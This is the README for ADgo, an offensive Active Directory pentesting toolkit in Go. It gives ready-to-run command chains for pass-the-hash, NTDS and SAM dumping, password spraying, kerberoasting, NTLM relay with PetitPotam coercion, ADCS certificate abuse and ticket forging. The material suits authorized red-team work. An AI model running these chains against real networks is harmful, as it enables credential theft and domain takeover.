# ADgo — Active Directory Pentesting Toolkit in Go

```
┌──────────────────────────────────────┐
│  █████╗ ██████╗  ██████╗  ██████╗   │
│ ██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗  │
│ ███████║██║  ██║██║  ███╗██║   ██║  │
│ ██╔══██║██║  ██║██║   ██║██║   ██║  │
│ ██║  ██║██████╔╝╚██████╔╝╚██████╔╝  │
│ ╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝   │
├──────────────────────────────────────┤
│     Active Directory toolkit in Go   │
│      github.com/n40y/adgo            │
└──────────────────────────────────────┘
```

**ADgo** is a pure Go offensive toolkit for Active Directory pentesting — a native alternative to NetExec, CrackMapExec, and impacket.

> ⚠️ **For authorized security testing only. The author accepts no responsibility for misuse.**

---

## ✨ What makes ADgo different

- **Pure Go** — single binary, no Python, no dependencies to install
- **NTLM Pass-the-Hash everywhere** — `--hash` works on every command
- **Playbooks** — Nuclei-style YAML templates to automate full attack chains
- **BloodHound CE collection** — equivalent of SharpHound `-c All` in one command
- **Native Kerberos** — kerberoast, AS-REP, S4U2Proxy, kerbrute — no Rubeus needed
- **Persistent sessions** — `--session` accumulates credentials across commands

---

## 📋 Table of Contents

- [Installation](#installation)
- [Quick Start](#quick-start)
- [Playbooks](#-playbooks--nuclei-style-templates) ← **key feature**
- [Commands Reference](#commands-reference)
- [Global Options](#global-options)
- [Project Structure](#project-structure)
- [Tests](#tests)
- [Dependencies](#dependencies)

---

## Installation

### Prerequisites
- **Go 1.21+**
- **Git**

### Build

```bash
git clone https://github.com/Fr3nch4Sec/adgo.git
cd adgo
go mod tidy

# Windows
go build -o adgo.exe ./cmd/adgo

# Linux / macOS
go build -o adgo ./cmd/adgo

./adgo --help
```

---

## Quick Start

```bash
# Discover hosts and test credentials
adgo scan 192.168.1.0/24 -u admin -p pass -d LAB

# All-in-one: scan → auth → exec on all reachable hosts
adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB

# Full BloodHound collection (= SharpHound -c All)
adgo bloodhound --dc-ip 192.168.1.10 -u admin -p pass -d LAB

# Pass-the-Hash on any command
adgo exec 192.168.1.10 -u admin --hash aad3b435b51404ee... -d LAB -c "whoami"
```

---

## 🎯 Playbooks — Nuclei-style Templates

Playbooks are **YAML files** that define a reusable sequence of adgo commands, shell scripts, and Python scripts to run against an AD environment. Variables are interpolated at runtime, making playbooks portable across labs and engagements.

### Concept

```
playbooks/              ← generic templates (shareable, commit to repo)
│  full-recon.yaml
│  lateral-movement.yaml
│  kerberoast-crack.yaml
│
labs/                   ← your environments (DO NOT commit)
   htb-pro-lab.env      ← DC_IP, DOMAIN, creds for this lab
   oscp-exam.env
   client-april.env
```

### Create your environment file

```bash
# Copy the example and fill in your values
cp playbooks/lab.env.example my-lab.env
```

```ini
# my-lab.env
DC_IP=192.168.1.10
DOMAIN=lab.local
USERNAME=administrator
PASSWORD=Password123
HASH=                        # optional: NT hash for PtH
SUBNET=192.168.1.0/24
WORDLIST=/usr/share/wordlists/rockyou.txt
```

### Run a playbook

```bash
# Run with a vars file
adgo playbook run playbooks/full-recon.yaml --vars-file my-lab.env

# Run with inline variables (override the file)
adgo playbook run playbooks/full-recon.yaml \
    -v DC_IP=192.168.1.10 -v DOMAIN=lab.local \
    -v USERNAME=admin -v PASSWORD=pass

# Dry-run: print commands without executing
adgo playbook run playbooks/full-recon.yaml --vars-file my-lab.env --dry-run

# Verbose: show step output
adgo playbook run playbooks/full-recon.yaml --vars-file my-lab.env --verbose
```

### Playbook commands

```bash
adgo playbook run      <file>      # Execute a playbook
adgo playbook list     [dir]       # List available playbooks (default: ./playbooks/)
adgo playbook validate <file>      # Check YAML syntax and show required variables
adgo playbook new      <name>      # Generate a blank template
```

### Built-in playbooks

| File | Description |
|---|---|
| `full-recon.yaml` | Complete enumeration: users, groups, ACLs, LAPS, gMSA, GPP, ADCS, BloodHound |
| `lateral-movement.yaml` | Scan subnet → test admin → secretsdump → exec command |
| `kerberoast-crack.yaml` | Kerberoast with RC4 downgrade → crack with hashcat |

### Playbook YAML format

```yaml
id: my-attack
name: My Custom Attack
description: "Full chain for lab.local"
author: yourname
tags: [recon, kerberos]

# Environment variables — use {{VAR}} for runtime values
env:
  dc_ip: "{{DC_IP}}"
  domain: "{{DOMAIN}}"
  username: "{{USERNAME}}"
  password: "{{PASSWORD}}"

steps:
  # Step type: adgo
  - id: enum-users
    name: Enumerate domain users
    type: adgo
    command: ldap users
    args:
      dc-ip: "{{dc_ip}}"
      username: "{{username}}"
      password: "{{password}}"
      domain: "{{domain}}"
      csv: "./output/users.csv"
    on_success: continue    # continue | stop | next:<step_id>
    on_failure: continue    # stop (default) | continue | next:<step_id>

  # Step type: shell — run any OS command
  - id: custom-cmd
    name: Run a shell command
    type: shell
    command: echo "Domain {{domain}} — DC {{dc_ip}}"

  # Step type: python — run a Python script
  - id: custom-script
    name: My Python script
    type: python
    command: ./scripts/my_script.py --dc {{dc_ip}} --domain {{domain}}
    timeout: 120
    on_failure: continue

  # Step type: condition — branch based on a value
  - id: check-result
    name: Check if output contains a value
    type: condition
    condition: "{{saved_output}} contains Administrator"
    on_failure: stop

  # Save step output as a variable for the next steps
  - id: get-dc-hostname
    name: Get DC hostname
    type: shell
    command: nslookup {{dc_ip}}
    save_output: dc_hostname

  # Disabled step (skipped)
  - id: optional-step
    name: Optional step
    type: adgo
    command: smb ntds
    disabled: true
```

### Step fields reference

| Field | Type | Description |
|---|---|---|
| `id` | string | Unique step identifier |
| `name` | string | Display name |
| `type` | string | `adgo`, `shell`, `python`, `condition` |
| `command` | string | adgo subcommand or OS command |
| `args` | map | adgo flags (without `--`) |
| `timeout` | int | Seconds before killing the step (default: 120) |
| `on_success` | string | `continue` (default), `stop`, `next:<id>` |
| `on_failure` | string | `stop` (default), `continue`, `next:<id>` |
| `save_output` | string | Store stdout into a variable |
| `condition` | string | Expression: `var == value`, `var contains text` |
| `disabled` | bool | Skip this step |

---

## Commands Reference

### Global Options

| Option | Description |
|---|---|
| `-u, --username` | Username |
| `-p, --password` | Password |
| `-d, --domain` | Domain (e.g. `lab.local`) |
| `--hash` / `--ntlm` | NT hash for Pass-the-Hash |
| `--dc-ip` | Domain Controller IP |
| `--json` | JSON output |
| `--bloodhound` | BloodHound CE JSON output |
| `--quiet` | Suppress info messages |
| `--no-banner` | Disable ASCII banner |
| `--debug` | Debug mode |
| `--session` | Save findings to `~/.adgo/session_<domain>_<date>.json` |
| `--log-file` | Append all events to a JSON log file |

---

### Discovery & Execution

| Command | Description |
|---|---|
| `autopwn <target>` | All-in-one: scan → auth → exec on all hosts |
| `scan <target>` | Discover hosts with SMB/WinRM open, test credentials |
| `exec <target> -c <cmd>` | Execute command via SMB or WinRM (auto-detect) |
| `proxy --listen 127.0.0.1:1080` | Local SOCKS5 proxy for pivoting |
| `relay --target <ip> --type adcs\|ldap\|smb` | NTLM relay server |

```bash
# Scan a subnet and test credentials
adgo scan 192.168.1.0/24 -u admin -p pass -d LAB

# Execute command on multiple hosts
adgo exec 192.168.1.0/24 -u admin -p pass -d LAB -c "net localgroup administrators"

# All-in-one with session logging
adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB --session --log-file run.jsonl

# Resume an interrupted scan
adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB --resume --state-file scan.state
```

---

### BloodHound Collection

| Command | Description |
|---|---|
| `bloodhound --dc-ip <ip>` | Collect users, groups, computers, ACLs for BloodHound CE |

```bash
# Full collection (equivalent to SharpHound -c All)
adgo bloodhound --dc-ip 192.168.1.10 -u admin -p pass -d LAB

# Without ACL enumeration (faster)
adgo bloodhound --dc-ip 192.168.1.10 -u admin -p pass -d LAB --no-acl

# Import into BloodHound CE
bloodhound-cli upload --path ./bloodhound/
```

---

### LDAP Enumeration

| Command | Description |
|---|---|
| `ldap users` | Enumerate users (SPN, disabled, AS-REP roastable, admin count) |
| `ldap groups` | Enumerate groups with members resolved to SIDs |
| `ldap computers` | Enumerate computers (OS, delegation flags) |
| `ldap spns` | List Kerberoastable accounts (with SPNs) |
| `ldap asreproast` | Find accounts with pre-auth disabled |
| `ldap password-policy` | Read lockout threshold and observation window |
| `ldap acl` | Find dangerous ACLs (GenericAll, DCSync, WriteDACL...) |
| `ldap trusts` | Enumerate domain trust relationships |
| `ldap rbcd --target <machine>` | Configure / read / clear RBCD |
| `ldap shadowcred --target <user>` | Shadow Credentials attack |

```bash
# Export users to CSV
adgo ldap users --dc-ip 192.168.1.10 -u admin -p pass -d LAB --csv users.csv

# Find dangerous ACLs with abuse info
adgo ldap acl --dc-ip 192.168.1.10 -u admin -p pass -d LAB --show-abuse

# Shadow Credentials — add key, get TGT without knowing password
adgo ldap shadowcred --dc-ip 192.168.1.10 -u admin -p pass -d LAB --target john
certipy auth -pfx john_shadow.pfx -dc-ip 192.168.1.10

# RBCD full chain
adgo ldap rbcd --dc-ip 192.168.1.10 -u admin -p pass -d LAB \
    --target DC01$ --attacker ATTACKER$
adgo kerberos s4u --dc-ip 192.168.1.10 -u ATTACKER$ -p pass -d LAB \
    --impersonate administrator --spn cifs/dc01.lab.local
```

---

### Credential Attacks

| Command | Description |
|---|---|
| `laps --dc-ip <ip>` | Read LAPS passwords (ms-Mcs-AdmPwd / msLAPS-Password) |
| `gmsa --dc-ip <ip>` | Read gMSA NT hashes (msDS-ManagedPassword) |
| `gpp --dc-ip <ip>` | Scan SYSVOL for GPP cpassword (MS14-025) |
| `smb secretsdump <target>` | Dump local hashes via Remote Registry (SAM hive) |
| `smb ntds <target>` | Dump NTDS.dit via VSS shadow copy (requires DA) |
| `spray --users <f> --passwords <f>` | Password spray with auto anti-lockout |

```bash
# LAPS — read admin password for a specific computer
adgo laps --dc-ip 192.168.1.10 -u admin -p pass -d LAB --computer WEB01

# GPP — any domain user can read SYSVOL
adgo gpp --dc-ip 192.168.1.10 -u anyuser -p pass -d LAB

# NTDS dump via VSS (requires DA)
adgo smb ntds 192.168.1.10 -u admin -p pass -d LAB --cleanup --output ./loot/
impacket-secretsdump -ntds ./loot/xxxx_ntds.dit -system ./loot/xxxx_system.hiv LOCAL

# Password spray — delay auto-calculated from lockout policy
adgo spray --users users.txt --passwords pass.txt -d LAB --dc-ip 192.168.1.10 -u reader -p pass
```

---

### Kerberos

| Command | Description |
|---|---|
| `kerberos kerberoast --dc-ip <ip>` | Request TGS for SPN accounts |
| `kerberos kerberoast --force-rc4` | Force RC4 enctype (hashcat mode 13100, faster) |
| `kerberos asreproast --dc-ip <ip>` | AS-REP Roasting (no credentials needed with `--no-creds`) |
| `kerberos getTGT` | Request a TGT, export `.ccache` |
| `kerberos userenum --users <f>` | Enumerate valid accounts via AS-REQ (no credentials) |
| `kerberos kerspray --users <f> -p <p>` | Kerberos password spray (stealthier than NTLM) |
| `kerberos s4u --impersonate <user> --spn <spn>` | S4U2Self + S4U2Proxy (RBCD abuse) |
| `kerberos goldenticket` | Forge a Golden Ticket |
| `kerberos silverticket` | Forge a Silver Ticket |

```bash
# Kerberoast — force RC4 for faster cracking
adgo kerberos kerberoast --dc-ip 192.168.1.10 -u admin -p pass -d LAB \
    --force-rc4 --analyze --output hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

# User enumeration — no credentials needed
adgo kerberos userenum --users users.txt -d lab.local --dc-ip 192.168.1.10

# Kerberos spray — generates Event 4768 instead of 4625
adgo kerberos kerspray --users users.txt -p Password123 -d lab.local --dc-ip 192.168.1.10

# S4U2Proxy — impersonate Administrator via RBCD
adgo kerberos s4u --dc-ip 192.168.1.10 -u ATTACKER$ -p pass -d LAB \
    --impersonate administrator --spn cifs/dc01.lab.local
# → administrator@cifs_dc01.lab.local.ccache
export KRB5CCNAME=administrator@cifs_dc01.lab.local.ccache
impacket-secretsdump -k -no-pass dc01.lab.local
```

---

### ADCS — Certificate Services

| Command | Description |
|---|---|
| `adcs --dc-ip <ip>` | Full audit: ESC1 through ESC8 |

Detected vulnerabilities:

| ESC | Description | Impact |
|---|---|---|
| ESC1 | SAN enabled + Client Auth + no approval | Forge any user certificate |
| ESC2 | Any Purpose EKU | Usable for any authentication |
| ESC3 | Certificate Request Agent | Enroll on behalf of others |
| ESC4 | WriteProperty on template | Modify template → enable ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | Arbitrary SAN on any template |
| ESC7 | ManageCA / ManageCertificates accessible | Approve your own certificates |
| ESC8 | Web Enrollment over HTTP with NTLM | Relay target → get certificate |

```bash
adgo adcs --dc-ip 192.168.1.10 -u admin -p pass -d LAB

# After finding ESC1:
certipy req -ca '<CA Name>' -template <TEMPLATE> -upn administrator@lab.local
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10

# ESC8 relay
adgo relay --target 192.168.1.10 --type adcs --listen 0.0.0.0:80
# Then trigger with PetitPotam:
python3 PetitPotam.py <RELAY_IP> <TARGET_DC>
```

---

### NTLM Relay

| Command | Description |
|---|---|
| `relay --target <ip> --type adcs` | Relay to ADCS web enrollment (ESC8) |
| `relay --target <ip> --type ldap` | Relay to LDAP (RBCD, shadow creds) |
| `relay --target <ip> --type smb` | Relay to SMB (exec command) |

```bash
# Relay to ADCS — get a certificate for the victim
adgo relay --target 192.168.1.10 --type adcs

# Trigger NTLM authentication with:
python3 PetitPotam.py <YOUR_IP> 192.168.1.10   # unauthenticated
python3 printerbug.py domain/user:pass@<DC_IP> <YOUR_IP>
sudo mitm6 -d lab.local
```

---

### Proxy & Pivoting

```bash
# Start a local SOCKS5 proxy
adgo proxy --listen 127.0.0.1:1080

# Use with proxychains
export ALL_PROXY=socks5://127.0.0.1:1080
adgo ldap users --dc-ip 172.16.0.1 -u admin -p pass -d INTERNAL
proxychains impacket-secretsdump admin:pass@172.16.0.1
```

---

### Other Modules

| Command | Description |
|---|---|
| `exploits zerologon --target <ip>` | ZeroLogon (CVE-2020-1472) |
| `exploits dcsync` | DCSync — dump domain hashes via DRSUAPI |
| `lateral-movement pth` | Pass-the-Hash via SMB |
| `lateral-movement psexec` | Remote execution via PSExec |
| `coercion petitpotam` | Coerce NTLM via PetitPotam |
| `coercion printerbug` | Coerce NTLM via PrinterBug (MS-RPRN) |
| `rpc enumerate` | Enumerate via RPC |
| `winrm exec` | Execute commands via WinRM |
| `wmi query` | WMI queries |
| `ntlm ntlmrelay` | NTLM relay (HTTP mode) |
| `samr` | SAMR enumeration via LDAP |

---

### Session & Logging

```bash
# Save all findings across commands
adgo bloodhound --dc-ip 192.168.1.10 -u admin -p pass -d LAB --session

# JSON structured log (importable in Splunk, jq, etc.)
adgo autopwn 192.168.1.0/24 -u admin -p pass -d LAB --log-file run.jsonl

# Resume an interrupted scan
adgo scan 192.168.1.0/24 -u admin -p pass -d LAB --resume --state-file scan.state
```

---

## 🗂 Project Structure

```
adgo/
├── cmd/
│   └── adgo/
│       ├── main.go
│       └── commands/
│           ├── autopwn_cmd.go       # All-in-one attack chain
│           ├── bloodhound_cmd.go    # BloodHound CE collection
│           ├── adcs_cmd.go          # ADCS ESC1-8 audit
│           ├── playbook_cmd.go      # Playbook engine CLI
│           ├── laps_cmd.go          # LAPS, gMSA, GPP
│           ├── delegation_cmd.go    # S4U2Proxy, RBCD, secretsdump
│           ├── kerbrute_cmd.go      # userenum, kerspray, kerberoast RC4
│           ├── relay_cmd.go         # NTLM relay
│           ├── shadowcred_cmd.go    # Shadow Credentials
│           ├── trusts_cmd.go        # Domain trusts
│           ├── acl_cmd.go           # ACL enumeration
│           ├── proxy_cmd.go         # SOCKS5 proxy
│           ├── scan_cmd.go          # Network scan
│           ├── exec_cmd.go          # Remote exec
│           ├── ldap.go              # LDAP commands
│           ├── kerberos_cmd.go      # Kerberos commands
│           └── ...
├── pkg/
│   ├── playbook/                    # Playbook engine
│   │   └── playbook.go
│   ├── adattack/                    # Shadow Creds, ACL, RBCD
│   │   ├── shadow_creds.go
│   │   ├── acl.go
│   │   └── adattack_test.go
│   ├── adcs/                        # ADCS ESC1-8
│   │   └── esc_advanced.go
│   ├── common/                      # Shared utilities
│   │   ├── output.go                # PrintTable, Spinner, NxStyle
│   │   ├── session.go               # Persistent session + JSON logging
│   │   ├── nxstyle.go               # NetExec-style output
│   │   └── bloodhound_export.go     # BloodHound CE export
│   ├── kerberos/
│   │   ├── tickets.go               # TGT, ccache MIT v4
│   │   ├── bruteforce.go            # userenum, kerspray
│   │   ├── s4u.go                   # S4U2Self + S4U2Proxy
│   │   └── rc4downgrade.go          # Force RC4 enctype
│   ├── ldap/
│   │   ├── ldap.go                  # LDAP client + enumeration
│   │   ├── laps.go                  # LAPS + gMSA
│   │   ├── trusts.go                # Domain trusts
│   │   └── rbcd.go                  # RBCD wrapper
│   ├── smb/
│   │   ├── svcexec.go               # Remote exec via SVCCTL
│   │   ├── secretsdump.go           # Local hash dump via registry
│   │   ├── shadowcopy.go            # NTDS dump via VSS
│   │   └── gpp.go                   # GPP cpassword decrypt
│   ├── scanner/                     # Network scanner
│   ├── proxy/                       # SOCKS5 proxy
│   ├── spray/                       # Password spray + rate limiting
│   │   └── ratelimit.go             # Adaptive rate limiter
│   ├── ntlm/relay/                  # NTLM relay engine
│   └── ...
├── playbooks/                       # Built-in playbook templates
│   ├── full-recon.yaml
│   ├── lateral-movement.yaml
│   ├── kerberoast-crack.yaml
│   └── lab.env.example              # Copy → fill → use with --vars-file
├── configs/
│   └── config.yaml
└── go.mod
```

---

## 🧪 Tests

```bash
# Run all tests
go test ./...

# Specific packages
go test ./pkg/common/ -v          # Output functions, spinner
go test ./pkg/smb/ -v             # GPP decryption (MS14-025 vectors)
go test ./pkg/spray/ -v           # Rate limiting logic
go test ./pkg/kerberos/ -v        # ccache format, bruteforce helpers
go test ./pkg/adattack/ -v        # Shadow Creds, ACL, RBCD, SID encoding
```

Test coverage includes:
- `DecryptCPassword` — validated against official MS14-025 vectors
- `parseSID` / `encodeSID` round-trip
- `buildKeyCredentialBlob` structure and Base64 KeyID
- `calculateSafeDelay` anti-lockout margin
- `PrintTable`, `Spinner`, `PrintCredential` output functions

---

## 🔑 Dependencies

| Package | Usage |
|---|---|
| `github.com/spf13/cobra` | CLI framework |
| `github.com/go-ldap/ldap/v3` | LDAP client (NTLM + PtH) |
| `github.com/hirochachacha/go-smb2` | SMB client (PtH, exec, hive download) |
| `github.com/jcmturner/gokrb5/v8` | Kerberos (TGT, TGS, S4U, ccache) |
| `github.com/masterzen/winrm` | WinRM client |
| `github.com/Azure/go-ntlmssp` | NTLM relay parsing |
| `github.com/fatih/color` | Colored terminal output |
| `github.com/olekukonko/tablewriter` | Table rendering |
| `gopkg.in/yaml.v3` | Playbook YAML parsing |

---

## 🛡 Safety & Legal

- **Use only on systems you own or have explicit written permission to test.**
- Add `*.env`, `*.ccache`, `session_*.json` to your `.gitignore`.
- All attack commands implement cleanup options to restore the target to its original state (`--cleanup` for VSS, `--remove` for shadow credentials, `rbcd clear` for RBCD).

---

## 🚀 Contribute

1. Fork the repository
2. Create a branch: `git checkout -b feature/my-feature`
3. Commit: `git commit -m 'Add my feature'`
4. Push and open a Pull Request

---

## 📜 License

MIT — see [LICENSE](LICENSE) for details.

---

## 📬 Contact

- **GitHub** : [@Fr3nch4Sec](https://github.com/Fr3nch4Sec)
- **Mail** : yoanncoudry494@gmail.com
